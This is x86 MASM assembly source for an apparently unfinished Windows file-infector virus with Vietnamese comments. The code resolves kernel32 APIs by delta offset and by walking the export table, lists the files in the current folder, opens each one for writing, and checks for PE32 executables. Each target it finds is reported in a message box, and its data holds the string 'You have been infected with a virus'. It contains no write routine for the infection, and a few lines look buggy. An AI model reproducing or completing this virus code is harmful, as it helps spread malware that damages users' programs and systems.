.386
.model flat, stdcall
.stack 100h
option casemap:none
WIN32_FIND_DATAA STRUC
    dwFileAttributes     dd ?
    ftCreationTimeLow    dd ?
    ftCreationTimeHigh   dd ?
    ftLastAccessTimeLow  dd ?
    ftLastAccessTimeHigh dd ?
    ftLastWriteTimeLow   dd ?
    ftLastWriteTimeHigh  dd ?
    nFileSizeHigh        dd ?
    nFileSizeLow         dd ?
    dwReserved0          dd ?
    dwReserved1          dd ?
    cFileName            db 260 dup(?)
    cAlternateFileName   db 14 dup(?)
WIN32_FIND_DATAA ENDS
.code
print proc 
	mov edx , dword ptr [ebp + offset offsetString]
	add edx , ebp
	push 0
	push 0
	push edx
	push 0
	call dword ptr [ebp + offset handleMessageBoxA ]
	
	
	ret

print endp

read proc 

	mov edx , offset data
	add edx , ebp	
	push 100
	push edx 
	call dword ptr [ebp + offset handleRtlZeroMemory]
	
	mov edx , offset data
	add edx , ebp
	
	push 0
	push 0
	push dword ptr [ebp + offset number]
	push edx
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleReadFile]
	ret

read endp
main: ;main----
	call Delta
Delta:
	pop ebp 
	sub ebp , offset Delta
	mov dword ptr [ebp + offset va] , ebp
	;------------------------------------Get
	mov esi , dword ptr [esp]
	and esi , 0FFFF0000h
GetKernel32:
case1:
	cmp dword ptr [ebp + offset limit] , 00h
	je GetKernel32Error
	cmp word ptr [esi] , "ZM"
	je CheckPE
case2:
	sub esi , 10000h
	dec dword ptr [ebp + offset limit]
	jmp case1
CheckPE:
	mov edi , dword ptr [esi + 3Ch]
	add edi , esi  
	cmp dword ptr [edi] , "EP"
	je GetKernel32Success
	jmp case2
GetKernel32Error:
	mov esi , 0BFF7000h	
GetKernel32Success:
	mov eax , esi
	mov eax , dword ptr [eax + 3ch]
	add eax , esi
	add eax , 120
	mov eax , dword ptr [eax]
	add eax , esi ; dia chi tuyet doi den export table
    mov edx, [eax + 28]     
    add edx, esi
    mov dword ptr [ebp + offset AddressFunc], edx

    mov ecx, [eax + 32]    
    add ecx, esi
    mov dword ptr [ebp + offset AddressName], ecx

    mov ebx, [eax + 36]     
    add ebx, esi
    mov dword ptr [ebp + offset AddressOrd], ebx
	
	
	;;;;;
	mov ecx , dword ptr [ebp + offset AddressName]
loopFindGetProcAddress:
	mov eax , dword ptr [ecx]
	add eax , esi ; dia chi thuc su cua name func
	mov edi , -1
	mov ebx , 0
loopOneChar:
	inc edi
	cmp byte ptr [eax + edi] , 0
	je endFindAddress
	cmp byte ptr [ebp + offset GetProcAddressName + edi] ,0 
	je endFindAddress
	mov dh , byte ptr [ebp + offset GetProcAddressName + edi]
	cmp dh , byte ptr [eax + edi]
	je loopOneChar
	inc dword ptr [ebp + offset index]
	add ecx , 4
	jmp loopFindGetProcAddress
endFindAddress:
	mov ebx , dword ptr [ebp + offset index]
	mov edx , dword ptr [ebp + offset AddressOrd]
	movzx ecx, word ptr [edx + ebx*2]  
	mov edx , dword ptr [ebp + offset AddressFunc]
    mov eax, dword ptr [edx+ ecx*4]  
    add eax, esi 
	mov dword ptr [ebp + offset handleGetProcAddress] , eax
	mov edx , offset LoadLibraryName
	add edx , ebp
	push edx
	push esi
	call eax
	mov dword ptr [ebp + offset handleLoadLibrary] , eax
	;gio da co 2 handle cua ham quan trong nhat gio chi can duyet file cac kieu thoi nhi
	mov dword ptr [ebp + offset handleKernel32] , esi
	
	mov edx , offset GetCurrentDirectoryName
	add edx , ebp
	push edx
	push esi
	call dword ptr [ebp + offset handleGetProcAddress]
	
	mov edx , offset path
	add edx , ebp 
	push edx 
	push 100
	call eax ;; 'ay duoc duong dan cung folder 
	
	mov  ecx , 0
loopNewPath:	
	cmp byte ptr [ebp + offset path + ecx] , 0
	je nextLoopPath
	inc ecx
	jmp loopNewPath
nextLoopPath:
	mov byte ptr [ebp + offset path + ecx] , "\"
	mov byte ptr [ebp + offset path + ecx + 1] , "*"
	
	mov edx , offset FindFirstFileAName
	add edx , ebp
	push edx
	push esi
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleFindFirstFileA] , eax
	;;; duoc duong dan day du 
	mov edx , offset wfd
	add edx , ebp 
	push edx
	mov edx , offset path
	add edx , ebp
	push edx
	call dword ptr [ebp + offset handleFindFirstFileA]
	mov dword ptr [ebp + offset handle] , eax
	
	;----------------------------
	;FindNextFileA 
	mov edx , offset FindNextFileAName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleFindNextFileA] , eax
	;-------------------------------
	;MessageBox
	mov edx , offset user32
	add edx , ebp
	push edx
	call handleLoadLibrary
	mov dword ptr [ebp + offset handleUser32] , eax
	
	mov edx , offset MessageBoxAName
	add edx , ebp 
	push edx 
	push dword ptr [ebp + offset handleUser32]
	call dword ptr [handleGetProcAddress]
	
	mov dword ptr [ebp + offset handleMessageBoxA] , eax
	;-------------------------------------------------
	;; loop tung file
loopFileok:
	mov edx , offset wfd
	add edx , ebp 
	push edx
	push dword ptr [ebp + offset handle]
	call dword ptr [ebp + offset handleFindNextFileA]
	cmp eax , 0
	je endMain
	cmp dword ptr [ebp + wfd.dwFileAttributes] , 10h
	jz loopFileok
	cmp byte ptr [ebp + wfd.cFileName] , "."
	je loopFileok
	cmp byte ptr [ebp + wfd.cFileName + 1] , "."
	je loopFileok
	;main
	mov edx , offset RtlZeroMemoryName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp +offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleRtlZeroMemory] , eax
	
	mov edx , offset pathNew
	add edx , ebp	
	push 100
	push edx 
	call dword ptr [ebp + offset handleRtlZeroMemory]
	mov ecx , 0
loopGetNewName:
	cmp byte ptr [ebp + offset path + ecx] , 0
	je endLoopNewName
	mov dl , byte ptr [ebp + offset path +ecx]
	mov byte ptr [ebp + offset pathNew +ecx] , dl
	inc ecx 
	jmp loopGetNewName
endLoopNewName:
	mov byte ptr [ebp + offset  pathNew + ecx - 1] , 0
	dec  ecx
	mov ebx , 0
loopGetNewName2:
	cmp byte ptr [ebp + offset wfd.cFileName + ebx ] , 0
	je endloopGetNewName2
	mov dl ,byte ptr [ebp + offset wfd.cFileName +ebx]
	mov byte ptr [ebp + offset pathNew +ecx] , dl
	inc ecx
	inc ebx
	jmp loopGetNewName2
endloopGetNewName2:

	mov edx , offset CreateFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleCreateFile] , eax
	
	mov edx , offset pathNew
	add edx , ebp
	push 0
	push 128
	push 3
	push 0
	push 0
	push 0C0000000h
	push edx
	call dword ptr [ebp + offset handleCreateFile]
	mov dword ptr [ebp + offset handleFile] , eax
	
	;------------
	
	mov edx , offset ReadFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleReadFile ] , eax
	
	mov edx , offset WriteFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleWriteFile ] , eax
	
	;-------------check Pe
	mov dword ptr [ebp + offset number] , 2
	call read
	cmp word ptr [ebp + offset data] , 5A4Dh
	jne loopFileok
	;----------------
	mov edx , offset SetFilePointerName
	add edx , ebp 
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleSetFilePointer] , eax
	
	push 0
	push 0
	push 60
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer]
	
	mov dword ptr [ebp +offset number] , 4
	call read
	push 0
	push 0
	push dword ptr [ebp + offset data]
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer]
	
	mov dword ptr [ebp + offset number] , 4
	call read
	
	cmp dword ptr [ebp + offset data ] , 00004550h
	jne loopFileok
	
	;-------------------------
	push 1
	push 0
	push 20
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer]
	
	mov dword ptr [ebp + offset data] , 2
	call read
	cmp word ptr [ebp +offset data] , 010Bh
	jne loopFileok
	;-------------------------------------------
	mov dword ptr [ebp + offset offsetString] , offset pathNew
	call print
	;mov dword ptr [ebp + offset offsetString] , offset data
	;call print 
	;;
	jmp loopFileok
endMain:
;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SetFilePointerName db "SetFilePointer" , 0
handleSetFilePointer dd ?
WriteFileName db "WriteFile" , 0
handleWriteFile dd ?
ReadFileName db "ReadFile" , 0
handleReadFile dd ?
CreateFileName db "CreateFileA" , 0
handleCreateFile dd ?
RtlZeroMemoryName db "RtlZeroMemory" , 0
handleRtlZeroMemory dd ?
FindNextFileAName db "FindNextFileA" , 0
handleFindNextFileA dd ?
user32 db "user32.dll" , 0
handleUser32 dd ?
AddressName dd ?    
AddressOrd  dd ?    
AddressFunc dd ?    
index dd 0
FindFirstFileAName db "FindFirstFileA" , 0
handleFindFirstFileA dd ?
MessageBoxAName db "MessageBoxA" , 0
handleMessageBoxA dd ?
GetCurrentDirectoryName db "GetCurrentDirectoryA" , 0
GetProcAddressName db "GetProcAddress",0
LoadLibraryName db "LoadLibraryA" , 0
handleLoadLibrary dd ?
handleGetProcAddress dd ?
handleKernel32 dd ?
limit dd 20
kernel32Base dd ?
infectorCheck db 0
va dd ?
path db 100 dup (0) ;
handle dd ?
handleFile dd ?
pathNew db 100 dup (0)
data db 100 dup (0)
flagCheckExe db 0
virtualAddress dd ?
ifanew dd ?
sectionNumber dw ?
notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
wfd WIN32_FIND_DATAA <>
offsetString dd ?
number dd ?
end main
